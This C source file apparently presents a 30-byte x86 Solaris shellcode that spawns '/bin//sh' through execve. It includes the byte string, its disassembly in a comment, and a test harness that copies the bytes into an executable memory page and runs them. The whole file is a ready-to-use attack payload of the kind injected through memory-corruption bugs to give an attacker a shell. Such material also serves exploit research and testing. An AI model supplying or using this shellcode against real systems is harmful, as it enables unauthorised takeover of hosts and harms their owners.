#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

/*
 * SunOS (Solaris) / x86 execvex() 30 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
 *
 * Disassembly of section .text:
 *
 * 08050428 <_start>:
 * 8050428:       33 f6                   xor    %esi,%esi
 * 805042a:       56                      push   %esi
 * 805042b:       68 6e 2f 73 68          push   $0x68732f6e
 * 8050430:       68 2f 2f 62 69          push   $0x69622f2f
 * 8050435:       8b dc                   mov    %esp,%ebx
 * 8050437:       56                      push   %esi
 * 8050438:       53                      push   %ebx
 * 8050439:       8b cc                   mov    %esp,%ecx
 * 805043b:       56                      push   %esi
 * 805043c:       56                      push   %esi
 * 805043d:       51                      push   %ecx
 * 805043e:       53                      push   %ebx
 * 805043f:       33 c0                   xor    %eax,%eax
 * 8050441:       b0 3b                   mov    $0x3b,%al
 * 8050443:       50                      push   %eax
 * 8050444:       cd 91                   int    $0x91
 */

int main(void)
{
	char *shellcode = "\x33\xf6\x56\x68\x6e\x2f\x73\x68"
                          "\x68\x2f\x2f\x62\x69\x8b\xdc\x56"
                          "\x53\x8b\xcc\x56\x56\x51\x53\x33"
                          "\xc0\xb0\x3b\x50\xcd\x91";
	void (*pcall)(void) = mmap(
		NULL,
		sysconf(_SC_PAGESIZE),
		PROT_WRITE| PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1,
		0
	);

	if (pcall == MAP_FAILED) {
		perror("mmap()");
		return -1;
	}

	struct utsname uts;

	if (uname(&uts) < 0) {
		perror("uname()");
		munmap(pcall, sysconf(_SC_PAGESIZE));
		return -1;
	}

	printf("[*] Machine info\n");
	printf(" [*] sys: %s\n", uts.sysname);
	printf(" [*] node: %s\n", uts.nodename);
	printf(" [*] release: %s\n", uts.release);
	printf(" [*] version: %s\n", uts.version);
	printf(" [*] machine: %s\n", uts.machine);

	printf("[*] Copying shellcode into crafted buffer.\n");
	memcpy(pcall, shellcode, strlen(shellcode));

	printf("[*] Executing the shellcode..\n");
	pcall();

	return 0;
}
